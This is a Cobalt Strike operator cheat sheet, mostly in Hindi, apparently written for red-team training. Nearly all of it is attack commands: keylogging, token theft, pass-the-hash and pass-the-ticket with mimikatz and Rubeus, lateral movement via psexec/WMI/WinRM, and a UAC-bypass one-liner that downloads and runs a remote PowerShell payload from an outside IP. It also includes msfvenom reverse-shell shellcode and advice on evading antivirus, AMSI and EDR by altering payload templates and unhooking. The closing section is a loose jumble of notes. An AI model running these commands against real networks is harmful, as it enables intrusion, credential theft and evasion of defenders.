# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` फिर आप चुन सकते हैं कि कहाँ सुनना है, किस प्रकार का बीकन उपयोग करना है (http, dns, smb...) और अधिक।

### Peer2Peer Listeners

इन लिस्नर्स के बीकन को सीधे C2 से बात करने की आवश्यकता नहीं है, वे अन्य बीकनों के माध्यम से इसके साथ संवाद कर सकते हैं।

`Cobalt Strike -> Listeners -> Add/Edit` फिर आपको TCP या SMB बीकन का चयन करना होगा।

* **TCP बीकन चयनित पोर्ट में एक लिस्नर सेट करेगा**। TCP बीकन से कनेक्ट करने के लिए दूसरे बीकन से `connect <ip> <port>` कमांड का उपयोग करें।
* **smb बीकन चयनित नाम के साथ एक पिपेनाम में सुनता है**। SMB बीकन से कनेक्ट करने के लिए आपको `link [target] [pipe]` कमांड का उपयोग करना होगा।

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** HTA फ़ाइलों के लिए
* **`MS Office Macro`** एक ऑफिस दस्तावेज़ के लिए जिसमें एक मैक्रो है
* **`Windows Executable`** एक .exe, .dll या सेवा .exe के लिए
* **`Windows Executable (S)`** एक **stageless** .exe, .dll या सेवा .exe के लिए (stageless स्टेज्ड से बेहतर है, कम IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` यह Cobalt Strike से बीकन डाउनलोड करने के लिए एक स्क्रिप्ट/एक्जीक्यूटेबल उत्पन्न करेगा, जैसे: bitsadmin, exe, powershell और python।

#### Host Payloads

यदि आपके पास पहले से वह फ़ाइल है जिसे आप वेब सर्वर में होस्ट करना चाहते हैं, तो बस `Attacks -> Web Drive-by -> Host File` पर जाएं और होस्ट करने के लिए फ़ाइल का चयन करें और वेब सर्वर कॉन्फ़िगरेशन करें।

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly </path/to/executable.exe>
# ध्यान दें कि 1MB से बड़े असेंबली को लोड करने के लिए, मलेबल प्रोफ़ाइल की 'tasks_max_size' प्रॉपर्टी को संशोधित करने की आवश्यकता है।

# Screenshots
printscreen    # PrintScr विधि के माध्यम से एकल स्क्रीनशॉट लें
screenshot     # एकल स्क्रीनशॉट लें
screenwatch    # डेस्कटॉप के नियमित स्क्रीनशॉट लें
## उन्हें देखने के लिए View -> Screenshots पर जाएं

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes पर जाएं ताकि दबाए गए कुंजियों को देख सकें

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # किसी अन्य प्रक्रिया के अंदर पोर्टस्कैन क्रिया को इंजेक्ट करें
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Powershell मॉड्यूल आयात करें
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <यहाँ बस powershell cmd लिखें> # यह सबसे उच्चतम समर्थित powershell संस्करण का उपयोग करता है (नहीं oppsec)
powerpick <cmdlet> <args> # यह spawnto द्वारा निर्दिष्ट एक बलिदान प्रक्रिया बनाता है, और बेहतर opsec (लॉगिंग नहीं) के लिए इसमें UnmanagedPowerShell इंजेक्ट करता है।
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # यह निर्दिष्ट प्रक्रिया में UnmanagedPowerShell को इंजेक्ट करता है ताकि PowerShell cmdlet चल सके।

# User impersonation
## क्रेड्स के साथ टोकन जनरेशन
make_token [DOMAIN\user] [password] # नेटवर्क में एक उपयोगकर्ता का अनुकरण करने के लिए टोकन बनाएं
ls \\computer_name\c$ # कंप्यूटर में C$ तक पहुँचने के लिए जनरेट किए गए टोकन का उपयोग करने का प्रयास करें
rev2self # make_token के साथ जनरेट किए गए टोकन का उपयोग करना बंद करें
## make_token का उपयोग करने से घटना 4624 उत्पन्न होती है: एक खाता सफलतापूर्वक लॉग ऑन हुआ। यह घटना Windows डोमेन में बहुत सामान्य है, लेकिन लॉगऑन प्रकार पर फ़िल्टर करके इसे संकीर्ण किया जा सकता है। जैसा कि ऊपर उल्लेख किया गया है, यह LOGON32_LOGON_NEW_CREDENTIALS का उपयोग करता है जो प्रकार 9 है।

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## pid से टोकन चुराना
## make_token की तरह लेकिन एक प्रक्रिया से टोकन चुराना
steal_token [pid] # इसके अलावा, यह नेटवर्क क्रियाओं के लिए उपयोगी है, स्थानीय क्रियाओं के लिए नहीं
## API दस्तावेज़ से हम जानते हैं कि यह लॉगऑन प्रकार "caller को अपने वर्तमान टोकन को क्लोन करने की अनुमति देता है"। यही कारण है कि बीकन आउटपुट कहता है अनुकरण किया गया <current_username> - यह हमारे अपने क्लोन किए गए टोकन का अनुकरण कर रहा है।
ls \\computer_name\c$ # कंप्यूटर में C$ तक पहुँचने के लिए जनरेट किए गए टोकन का उपयोग करने का प्रयास करें
rev2self # steal_token से टोकन का उपयोग करना बंद करें

## नए क्रेडेंशियल्स के साथ प्रक्रिया लॉन्च करें
spawnas [domain\username] [password] [listener] # ऐसा किसी निर्देशिका से करें जिसमें पढ़ने की अनुमति हो जैसे: cd C:\
## make_token की तरह, यह Windows घटना 4624 उत्पन्न करेगा: एक खाता सफलतापूर्वक लॉग ऑन हुआ लेकिन लॉगऑन प्रकार 2 (LOGON32_LOGON_INTERACTIVE) के साथ। यह कॉलिंग उपयोगकर्ता (TargetUserName) और अनुकरण किए गए उपयोगकर्ता (TargetOutboundUserName) का विवरण देगा।

## प्रक्रिया में इंजेक्ट करें
inject [pid] [x64|x86] [listener]
## OpSec के दृष्टिकोण से: जब तक आपको वास्तव में आवश्यकता न हो, क्रॉस-प्लेटफ़ॉर्म इंजेक्शन न करें (जैसे x86 -> x64 या x64 -> x86)।

## Pass the hash
## इस संशोधन प्रक्रिया के लिए LSASS मेमोरी का पैचिंग आवश्यक है जो एक उच्च-जोखिम क्रिया है, स्थानीय व्यवस्थापक विशेषाधिकार की आवश्यकता होती है और यदि प्रोटेक्टेड प्रोसेस लाइट (PPL) सक्षम है तो यह सभी तरह से व्यवहार्य नहीं है।
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Mimikatz के माध्यम से हैश पास करें
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## /run के बिना, mimikatz एक cmd.exe स्पॉन करता है, यदि आप एक उपयोगकर्ता के रूप में डेस्कटॉप पर चल रहे हैं, तो वह शेल देखेगा (यदि आप SYSTEM के रूप में चल रहे हैं तो आप ठीक हैं)
steal_token <pid> #mimikatz द्वारा बनाई गई प्रक्रिया से टोकन चुराएं

## Pass the ticket
## एक टिकट का अनुरोध करें
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## नए टिकट के साथ उपयोग करने के लिए एक नया लॉगऑन सत्र बनाएं (समझौता किए गए को अधिलेखित न करने के लिए)
make_token <domain>\<username> DummyPass
## एक पॉवशेल सत्र से हमलावर मशीन में टिकट लिखें और इसे लोड करें
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## SYSTEM से टिकट पास करें
## टिकट के साथ एक नया प्रक्रिया उत्पन्न करें
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## उस प्रक्रिया से टोकन चुराएं
steal_token <pid>

## टिकट निकालें + टिकट पास करें
### टिकटों की सूची
execute-assembly C:\path\Rubeus.exe triage
### luid द्वारा दिलचस्प टिकट डंप करें
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### नए लॉगऑन सत्र का निर्माण करें, luid और processid नोट करें
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### जनरेट किए गए लॉगऑन सत्र में टिकट डालें
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### अंततः, उस नए प्रक्रिया से टोकन चुराएं
steal_token <pid>

# Lateral Movement
## यदि एक टोकन बनाया गया है, तो इसका उपयोग किया जाएगा
jump [method] [target] [listener]
## विधियाँ:
## psexec                    x86   एक सेवा का उपयोग करके एक सेवा EXE कलाकृति चलाएँ
## psexec64                  x64   एक सेवा का उपयोग करके एक सेवा EXE कलाकृति चलाएँ
## psexec_psh                x86   एक सेवा का उपयोग करके एक PowerShell एक-लाइनर चलाएँ
## winrm                     x86   WinRM के माध्यम से एक PowerShell स्क्रिप्ट चलाएँ
## winrm64                   x64   WinRM के माध्यम से एक PowerShell स्क्रिप्ट चलाएँ
## wmi_msbuild               x64   msbuild इनलाइन c# कार्य के साथ wmi लेटरल मूवमेंट (oppsec)

remote-exec [method] [target] [command] # remote-exec आउटपुट नहीं लौटाता है
## विधियाँ:
## psexec                          सेवा नियंत्रण प्रबंधक के माध्यम से दूरस्थ निष्पादन
## winrm                           WinRM (PowerShell) के माध्यम से दूरस्थ निष्पादन
## wmi                             WMI के माध्यम से दूरस्थ निष्पादन

## WMI के साथ एक बीकन निष्पादित करने के लिए (यह jump कमांड में नहीं है) बस बीकन अपलोड करें और इसे निष्पादित करें
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe

# Pass session to Metasploit - Through listener
## Metasploit होस्ट पर
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Cobalt पर: Listeners > Add और Payload को Foreign HTTP पर सेट करें। Host को 10.10.5.120 पर सेट करें, Port को 8080 पर सेट करें और Save पर क्लिक करें।
beacon> spawn metasploit
## आप केवल विदेशी लिस्नर के साथ x86 Meterpreter सत्र स्पॉन कर सकते हैं।

# Pass session to Metasploit - Through shellcode injection
## Metasploit होस्ट पर
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## msfvenom चलाएँ और multi/handler लिस्नर तैयार करें

## बिन फ़ाइल को Cobalt Strike होस्ट पर कॉपी करें
ps
shinject <pid> x64 C:\Payloads\msf.bin #x64 प्रक्रिया में मेटास्प्लॉइट शेलकोड इंजेक्ट करें

# Cobalt Strike में Metasploit सत्र पास करें
## स्टेजलेस बीकन शेलकोड उत्पन्न करें, Attacks > Packages > Windows Executable (S) पर जाएं, इच्छित लिस्नर का चयन करें, आउटपुट प्रकार के रूप में Raw का चयन करें और x64 पेलोड का उपयोग करें।
## मेटास्प्लॉइट में post/windows/manage/shellcode_inject का उपयोग करें ताकि उत्पन्न Cobalt Strike शेलकोड को इंजेक्ट किया जा सके।

# Pivoting
## टीम सर्वर में एक सॉक्स प्रॉक्सी खोलें
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

**`execute-assembly`** एक **बलिदान प्रक्रिया** का उपयोग करता है जो दूरस्थ प्रक्रिया इंजेक्शन का उपयोग करके निर्दिष्ट कार्यक्रम को निष्पादित करता है। यह बहुत शोर करता है क्योंकि किसी प्रक्रिया के अंदर इंजेक्ट करने के लिए कुछ Win APIs का उपयोग किया जाता है जिन्हें हर EDR चेक कर रहा है। हालाँकि, कुछ कस्टम टूल हैं जिनका उपयोग एक ही प्रक्रिया में कुछ लोड करने के लिए किया जा सकता है:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike में आप BOF (Beacon Object Files) का भी उपयोग कर सकते हैं: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

एग्रेसर स्क्रिप्ट `https://github.com/outflanknl/HelpColor` Cobalt Strike में `helpx` कमांड बनाएगा जो कमांड में रंग डाल देगा यह संकेत करते हुए कि वे BOFs (हरा), यदि वे Frok&Run (पीला) और इसी तरह हैं, या यदि वे ProcessExecution, इंजेक्शन या इसी तरह के हैं (लाल)। जो यह जानने में मदद करता है कि कौन से कमांड अधिक छिपे हुए हैं।

### Act as the user

आप घटनाओं की जांच कर सकते हैं जैसे `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- सुरक्षा EID 4624 - सामान्य संचालन के घंटों को जानने के लिए सभी इंटरएक्टिव लॉगऑन की जांच करें।
- सिस्टम EID 12,13 - शटडाउन/स्टार्टअप/नींद की आवृत्ति की जांच करें।
- सुरक्षा EID 4624/4625 - इनबाउंड वैध/अवैध NTLM प्रयासों की जांच करें।
- सुरक्षा EID 4648 - यह घटना तब उत्पन्न होती है जब प्लेनटेक्स्ट क्रेडेंशियल्स का उपयोग लॉगऑन के लिए किया जाता है। यदि किसी प्रक्रिया ने इसे उत्पन्न किया है, तो बाइनरी में संभावित रूप से क्रेडेंशियल्स स्पष्ट पाठ में एक कॉन्फ़िग फ़ाइल या कोड के अंदर हो सकते हैं।

जब Cobalt Strike से `jump` का उपयोग करते हैं, तो नए प्रक्रिया को अधिक वैध दिखाने के लिए `wmi_msbuild` विधि का उपयोग करना बेहतर है।

### Use computer accounts

यह सामान्य है कि रक्षक उपयोगकर्ताओं द्वारा उत्पन्न अजीब व्यवहार की जांच कर रहे हैं और **सेवा खातों और कंप्यूटर खातों जैसे `*$` को अपनी निगरानी से बाहर रखते हैं**। आप इन खातों का उपयोग लेटरल मूवमेंट या विशेषाधिकार वृद्धि करने के लिए कर सकते हैं।

### Use stageless payloads

Stageless payloads स्टेज्ड की तुलना में कम शोर करते हैं क्योंकि उन्हें C2 सर्वर से दूसरे चरण को डाउनलोड करने की आवश्यकता नहीं होती है। इसका मतलब है कि वे प्रारंभिक कनेक्शन के बाद कोई नेटवर्क ट्रैफ़िक उत्पन्न नहीं करते हैं, जिससे उन्हें नेटवर्क-आधारित सुरक्षा द्वारा पहचानने की संभावना कम होती है।

### Tokens & Token Store

जब आप टोकन चुराते हैं या उत्पन्न करते हैं तो सावधान रहें क्योंकि यह संभव है कि EDR सभी थ्रेड्स के सभी टोकनों को सूचीबद्ध कर सके और एक **विभिन्न उपयोगकर्ता** या यहां तक कि प्रक्रिया में SYSTEM से संबंधित **टोकन** खोज सके।

यह टोकनों को **प्रत्येक बीकन के लिए स्टोर** करने की अनुमति देता है ताकि बार-बार उसी टोकन को चुराने की आवश्यकता न हो। यह लेटरल मूवमेंट के लिए उपयोगी है या जब आपको कई बार चुराए गए टोकन का उपयोग करने की आवश्यकता होती है:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

लेटरल मूवमेंट करते समय, आमतौर पर **एक टोकन चुराना नए टोकन उत्पन्न करने से बेहतर होता है** या पास द हैश हमले को अंजाम देना।

### Guardrails

Cobalt Strike में **Guardrails** नामक एक विशेषता है जो कुछ कमांड या क्रियाओं के उपयोग को रोकने में मदद करती है जो रक्षकों द्वारा पहचानी जा सकती हैं। Guardrails को विशिष्ट कमांड, जैसे `make_token`, `jump`, `remote-exec`, और अन्य को ब्लॉक करने के लिए कॉन्फ़िगर किया जा सकता है जो आमतौर पर लेटरल मूवमेंट या विशेषाधिकार वृद्धि के लिए उपयोग किए जाते हैं।

इसके अलावा, रिपॉजिटरी [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) में कुछ चेक और विचार भी शामिल हैं जिन्हें आप एक पेलोड निष्पादित करने से पहले विचार कर सकते हैं।

### Tickets encryption

AD में टिकटों के एन्क्रिप्शन के साथ सावधान रहें। डिफ़ॉल्ट रूप से, कुछ टूल Kerberos टिकटों के लिए RC4 एन्क्रिप्शन का उपयोग करेंगे, जो AES एन्क्रिप्शन की तुलना में कम सुरक्षित है और डिफ़ॉल्ट रूप से अद्यतन वातावरण AES का उपयोग करेंगे। इसे रक्षकों द्वारा कमजोर एन्क्रिप्शन एल्गोरिदम के लिए निगरानी की जा सकती है।

### Avoid Defaults

Cobalt Strike का उपयोग करते समय डिफ़ॉल्ट रूप से SMB पाइप का नाम `msagent_####` और `"status_####` होगा। उन नामों को बदलें। Cobalt Strike से मौजूदा पाइप के नामों की जांच करने के लिए कमांड का उपयोग करना संभव है: `ls \\.\pipe\`

इसके अलावा, SSH सत्रों में `\\.\pipe\postex_ssh_####` नामक एक पाइप बनाया जाता है। इसे `set ssh_pipename "<new_name>";` के साथ बदलें।

इसके अलावा, पोस्ट एक्सप्लॉइटेशन हमले में पाइप `\\.\pipe\postex_####` को `set pipename "<new_name>"` के साथ संशोधित किया जा सकता है।

Cobalt Strike प्रोफाइल में आप निम्नलिखित जैसी चीजें भी संशोधित कर सकते हैं:

- `rwx` का उपयोग करने से बचना
- प्रक्रिया इंजेक्शन व्यवहार कैसे काम करता है (कौन से APIs का उपयोग किया जाएगा) `process-inject {...}` ब्लॉक में
- "fork and run" कैसे काम करता है `post-ex {…}` ब्लॉक में
- नींद का समय
- मेमोरी में लोड होने वाले बाइनरी का अधिकतम आकार
- मेमोरी फुटप्रिंट और DLL सामग्री `stage {...}` ब्लॉक के साथ
- नेटवर्क ट्रैफ़िक

### Bypass memory scanning

कुछ EDR ज्ञात मैलवेयर हस्ताक्षरों के लिए मेमोरी को स्कैन करते हैं। Cobalt Strike `sleep_mask` फ़ंक्शन को एक BOF के रूप में संशोधित करने की अनुमति देता है जो बैकडोर को मेमोरी में एन्क्रिप्ट करने में सक्षम होगा।

### Noisy proc injections

जब किसी प्रक्रिया में कोड इंजेक्ट किया जाता है तो यह आमतौर पर बहुत शोर करता है, इसका कारण यह है कि **कोई नियमित प्रक्रिया आमतौर पर इस क्रिया को नहीं करती है और इसे करने के तरीके बहुत सीमित हैं**। इसलिए, इसे व्यवहार-आधारित पहचान प्रणालियों द्वारा पहचाना जा सकता है। इसके अलावा, इसे EDRs द्वारा नेटवर्क को स्कैन करते समय भी पहचाना जा सकता है **कोड वाले थ्रेड्स के लिए जो डिस्क में नहीं हैं** (हालांकि प्रक्रियाएँ जैसे ब्राउज़र जो JIT का उपयोग करते हैं, यह सामान्यतः करते हैं)। उदाहरण: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

जब एक नई प्रक्रिया उत्पन्न की जाती है, तो यह महत्वपूर्ण है कि **प्रक्रियाओं के बीच एक नियमित माता-पिता-शिशु** संबंध बनाए रखा जाए ताकि पहचान से बचा जा सके। यदि svchost.exec iexplorer.exe को निष्पादित कर रहा है, तो यह संदिग्ध लगेगा, क्योंकि svchost.exe सामान्य Windows वातावरण में iexplorer.exe का माता-पिता नहीं है।

जब Cobalt Strike में एक नया बीकन स्पॉन किया जाता है, तो डिफ़ॉल्ट रूप से एक प्रक्रिया का उपयोग करके **`rundll32.exe`** बनाया जाता है ताकि नए लिस्नर को चलाया जा सके। यह बहुत छिपा हुआ नहीं है और EDRs द्वारा आसानी से पहचाना जा सकता है। इसके अलावा, `rundll32.exe` बिना किसी args के चलाया जाता है जिससे यह और भी संदिग्ध हो जाता है।

Cobalt Strike के निम्नलिखित कमांड के साथ, आप नए बीकन को स्पॉन करने के लिए एक अलग प्रक्रिया निर्दिष्ट कर सकते हैं, जिससे इसे पहचानना कम हो जाता है:
```bash
spawnto x86 svchost.exe
```
आप इस सेटिंग को **`spawnto_x86` और `spawnto_x64`** को एक प्रोफ़ाइल में भी बदल सकते हैं।

### हमलावरों के ट्रैफ़िक को प्रॉक्सी करना

हमलावरों को कभी-कभी उपकरणों को स्थानीय रूप से चलाने की आवश्यकता होती है, यहां तक कि लिनक्स मशीनों में भी, और पीड़ितों का ट्रैफ़िक उपकरण तक पहुँचाना होता है (जैसे NTLM रिले)।

इसके अलावा, कभी-कभी पास-थी-हैश या पास-थी-टिकट हमले को करने के लिए हमलावर के लिए **अपने स्वयं के LSASS प्रक्रिया में इस हैश या टिकट को जोड़ना** अधिक छिपा हुआ होता है और फिर इससे पिवट करना होता है बजाय इसके कि वह पीड़ित मशीन के LSASS प्रक्रिया को संशोधित करे।

हालांकि, आपको **उत्पन्न ट्रैफ़िक के साथ सावधान रहना चाहिए**, क्योंकि आप अपने बैकडोर प्रक्रिया से असामान्य ट्रैफ़िक (kerberos?) भेज सकते हैं। इसके लिए आप एक ब्राउज़र प्रक्रिया में पिवट कर सकते हैं (हालांकि आप एक प्रक्रिया में खुद को इंजेक्ट करते समय पकड़े जा सकते हैं, इसलिए इसे करने के लिए एक छिपा हुआ तरीका सोचें)।
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> पासवर्ड बदलें  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Change powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Change $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
